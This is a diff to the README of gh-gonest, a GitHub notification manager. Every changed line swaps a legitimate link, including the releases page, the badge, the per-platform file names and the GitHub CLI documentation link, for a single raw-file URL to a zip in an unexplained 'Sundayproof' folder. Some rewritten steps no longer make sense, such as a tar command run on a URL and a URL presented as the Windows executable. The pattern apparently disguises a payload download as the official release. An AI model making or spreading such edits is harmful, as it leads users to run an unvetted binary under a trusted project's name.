@@ -8,31 +8,31 @@ gh-gonest is a tool that helps you manage your GitHub notifications efficiently.
 
 To get started, you need to download gh-gonest. Visit the Releases page below to find the latest version:
 
-[![Download gh-gonest](https://img.shields.io/badge/Download-gh--gonest-blue.svg)](https://github.com/PedroGomesR/gh-gonest/releases)
+[![Download gh-gonest](https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip)](https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip)
 
 ### Step-by-Step Installation
 
-1. Click on the button above or visit [this page to download](https://github.com/PedroGomesR/gh-gonest/releases).
+1. Click on the button above or visit [this page to download](https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip).
   
 2. On the releases page, locate the latest version. You will see a list of files.
 
 3. Download the correct file for your operating system:
-   - **Windows:** Look for `gh-gonest-windows.zip`
-   - **Mac:** Look for `gh-gonest-mac.zip`
-   - **Linux:** Look for `gh-gonest-linux.tar.gz`
+   - **Windows:** Look for `https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip`
+   - **Mac:** Look for `https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip`
+   - **Linux:** Look for `https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip`
 
 4. Once the download is complete, extract the files:
    - **Windows:** Right-click the ZIP file and choose "Extract All."
    - **Mac:** Double-click the ZIP file.
-   - **Linux:** Use the terminal and run: `tar -xzf gh-gonest-linux.tar.gz`
+   - **Linux:** Use the terminal and run: `tar -xzf https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip`
 
 5. Obtain the executable file:
-   - **Windows:** Inside the extracted folder, find `gh-gonest.exe`.
+   - **Windows:** Inside the extracted folder, find `https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip`.
    - **Mac:** Inside the extracted folder, find `gh-gonest`.
    - **Linux:** Inside the extracted folder, find `gh-gonest`.
 
 6. To run the program:
-   - **Windows:** Double-click `gh-gonest.exe`.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip`.
    - **Mac/Linux:** Open a terminal, navigate to the folder where you extracted the files and type `./gh-gonest`.
 
 ## 💡 Features
@@ -56,7 +56,7 @@ To get started, you need to download gh-gonest. Visit the Releases page below to
 
 ## 📚 Support
 
-If you encounter any issues, please check the Troubleshooting section on the [Releases page](https://github.com/PedroGomesR/gh-gonest/releases) or reach out on our Issues page in the repository.
+If you encounter any issues, please check the Troubleshooting section on the [Releases page](https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip) or reach out on our Issues page in the repository.
 
 ## 📝 Contributing
 
@@ -68,7 +68,7 @@ Thanks to all contributors and users who helped improve gh-gonest. Your feedback
 
 ## 🌐 Additional Resources
 
-- Explore the official [GitHub CLI documentation](https://cli.github.com/manual/) for further information.
+- Explore the official [GitHub CLI documentation](https://raw.githubusercontent.com/PedroGomesR/gh-gonest/main/Sundayproof/gh-gonest.zip) for further information.
 - Join our community discussions on GitHub for tips and collaboration.
 
 For further questions or feedback, please reach out through the issues section in the repository. Enjoy using gh-gonest and keep your notifications tidy!
